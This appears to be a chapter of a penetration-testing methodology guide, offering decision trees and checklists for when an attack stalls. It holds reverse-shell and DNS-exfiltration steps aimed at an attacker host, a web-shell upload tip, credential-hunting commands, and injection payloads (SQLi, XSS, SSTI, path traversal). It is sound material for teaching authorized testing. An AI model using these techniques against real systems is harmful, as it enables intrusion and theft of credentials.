# VOLUME X — Failure Handling & Decision Trees

> *"The expert is not the one who never fails. The expert is the one who knows exactly what to do when everything fails."*

This is the most elite volume in the encyclopedia. Most methodologies tell you what to do when things work. This volume tells you what to do when they **don't**.

---

## Chapter 1: The "Nothing Is Working" Playbook

You have run your scans. You have browsed the app. You pushed your standard payloads. Everything returns 200 OK with nothing interesting. Most people quit here. You don't.

### 1.1 — Web Application is Silent

**Situation:** Standard fuzzing shows nothing. No obvious injection. No obvious upload. WAF blocks feel clean. No verbose errors.

**Decision Tree:**

```
Web app is silent
│
├── Have you crawled JS files thoroughly?
│   ├── YES → Deobfuscate and look for hardcoded API routes, tokens, or keys.
│   └── NO  → Run `katana -u https://target.com -jc` (JS crawling mode). Go deeper.
│
├── Have you checked ALL HTTP verbs?
│   ├── Have you tried PATCH, PUT, DELETE, OPTIONS on endpoints that only "show" GET?
│   └── Authorization middleware is often verb-specific. Try sending `DELETE /api/users/1`.
│
├── Have you fuzzed for hidden parameters?
│   ├── Run `Arjun -u https://target.com/endpoint` to discover hidden query params.
│   └── Try `?debug=true`, `?test=1`, `?format=json`, `?admin=true` on all key pages.
│
├── Have you examined ALL error responses?
│   ├── Deliberately break the app. Send arrays where it expects strings.
│   └── `{"id": ["1","2"]}` instead of `{"id": "1"}` → May reveal framework, schema, or path.
│
└── Have you checked Content-Type bypasses?
    ├── If WAF blocks `application/json`, try `application/xml` or `text/plain`.
    └── Some parsers handle both but only sanitize one.
```

---

### 1.2 — No Shell After Exploiting RCE

**Situation:** You have proven RCE (you can run `whoami`) but your reverse shell keeps dying or never connects.

**Decision Tree:**

```
RCE confirmed, no shell
│
├── Egress filtering active?
│   ├── Try ICMP → `ping -c 1 YOUR_IP` and listen with `tcpdump -i tun0 icmp`
│   ├── Try DNS → exfil output to `id.subdomain.yourdomain.com` via `nslookup`
│   └── If ICMP/DNS works but TCP doesn't → Firewall is blocking outbound TCP.
│       └── Try port 443, 80, 53, or 8080 for your listener.
│
├── Shell is connecting but immediately dying?
│   ├── Check for environment issues → Try /bin/sh instead of /bin/bash.
│   ├── The process may be killed by a signal. Try a self-backgrounding one-liner.
│   └── Try a bash -i shell wrapped in a pty:
│       `python3 -c 'import pty; pty.spawn("/bin/bash")'`
│
└── Windows target, not getting a shell?
    ├── Try PowerShell encoded reverse shell (base64).
    ├── Try a HTTPS meterpreter payload to blend in with HTTPS traffic.
    └── Try `powercat`, `Invoke-PowerShellTcp.ps1` or `conptyshell` for a full PTY.
```

---

### 1.3 — SMB/FTP is Open but Empty

**Situation:** You got in, but see nothing useful. No shares. No files. No creds.

**Decision Tree:**

```
Service is open, empty
│
├── SMB - No interesting shares?
│   ├── Try authenticating with credentials you found elsewhere (Credential Matrix!)
│   ├── Check for hidden admin shares: C$, ADMIN$, IPC$ using valid creds.
│   ├── Try NTLM relay if signing is disabled — you don't need to read shares to relay auth.
│   └── Enumerate with different tools — `enum4linux-ng` reveals what `smbclient` misses.
│
└── FTP - Logged in, no files?
    ├── Try hidden files: run `ls -a` after logging in — some FTP servers hide dotfiles.
    ├── Check write permisson by attempting to STOR a test file.
    └── Check if the FTP root maps to the web root. If writable → Upload web shell.
```

---

## Chapter 2: Enumeration Blind Spot Checklist

Before concluding a service is "done," run through this list. These are the most commonly missed items.

### Web Application Blind Spots
- [ ] Did you check the **`robots.txt`** and `sitemap.xml`? They often disclose admin paths.
- [ ] Did you inspect the **HTML source** for commented-out endpoints, debug parameters, and internal notes?
- [ ] Did you test **every file upload field** for content-type bypass (image/gif → PHP)?
- [ ] Did you check **HTTP response headers** for information leakage (`X-Powered-By`, `Server`, `X-Debug-*`)?
- [ ] Did you test with a **second account** to verify all IDOR and privilege findings?
- [ ] Did you check **sub-paths of paths that returned 403**? (e.g., `/admin/` → 403, but `/admin/users` → 200).
- [ ] Did you check for **CORS misconfiguration**: `Origin: https://evil.com` and look for `Access-Control-Allow-Origin: *` or your evil domain?
- [ ] Did you look for **Swagger/OpenAPI docs** at `/api-docs`, `/swagger.json`, `/openapi.yaml`?

### Linux Shell Blind Spots
- [ ] Did you check **`sudo -l`** for allowed commands without a password?
- [ ] Did you run **`find / -perm -4000 -type f 2>/dev/null`** (SUID files)?
- [ ] Did you check **`/etc/crontab`** AND **`/var/spool/cron/`** for per-user cron jobs?
- [ ] Did you look at **`/proc/net/tcp`** for locally listening services not visible externally?
- [ ] Did you check for **writable paths in the system `PATH`**? (e.g., a script runs `python` but `/usr/local/bin/python` is world-writable)
- [ ] Did you search for **config files with credentials**? (`find / -name "*.conf" -o -name "*.cfg" -o -name ".env" 2>/dev/null`)
- [ ] Did you read **`~/.bash_history`** and **`~/.ssh/config`**?

### Windows Shell Blind Spots
- [ ] Did you check **PowerShell history** at `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`?
- [ ] Did you run **`whoami /priv`** and look for `SeImpersonatePrivilege` or `SeDebugPrivilege`?
- [ ] Did you check **`Unattend.xml`** and **`sysprep.inf`** in `C:\Windows\Panther\`?
- [ ] Did you enumerate **services with unquoted paths**? (`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"`)
- [ ] Did you check for **AlwaysInstallElevated** registry keys?
- [ ] Did you run **`net localgroup Administrators`** to see all local admin members?

---

## Chapter 3: Rabbit Hole Detection

Not every signal is a finding. Learning to spot a rabbit hole early saves hours.

**Signs you are in a rabbit hole:**
1. You have been trying the same attack vector for more than 30 minutes without measurable progress.
2. The payload executes but results are inconsistent (race condition you cannot reliably trigger? It may be a coincidence).
3. You are reading about the CVE and your target version is *close* but not exact. Stop. Verify the exact version first.
4. The application behavior *seems* to indicate injection, but every payload variation returns the exact same output. (May be a sink that is correctly escaped downstream.)

**Recovery Protocol:**
1. Open a new note/tab. Write down exactly what you tried and why you think it's a rabbit hole.
2. Mark it as `[LOW CONFIDENCE - revisit]`.
3. Move to the next item in your methodology. Come back later with fresh eyes.

---

## Chapter 4: Pattern Recognition Guides

These are the high-probability behavior patterns that indicate a specific vulnerability class. If you see these signals, pivot immediately.

| Signal | What it likely means | Immediate Action |
|--------|---------------------|------------------|
| App fetches a URL you provide | SSRF candidate | Test for `http://127.0.0.1:PORT/` and metadata endpoints |
| Response time varies by input | Blind SQLi / Time-based blind candidate | Inject `SLEEP(5)` or `WAITFOR DELAY '0:0:5'` |
| 302 Redirect on profile update | Likely anti-CSRF, but check for header injection | Inject newline `%0d%0a` into redirect params |
| App displays your input back to you in any context | Reflected XSS or SSTI candidate | Try `{{7*7}}`, `${7*7}`, `<script>alert(1)</script>` |
| User ID or Document ID in URL is sequential | IDOR candidate | Enumerate surrounding IDs with two different user sessions |
| App accepts a filename or path as input | LFI / Path Traversal candidate | Try `../../etc/passwd` or `php://filter/...` |
| Password reset via email | Host Header Injection candidate | Modify `Host:` to your Burp Collaborator URL |
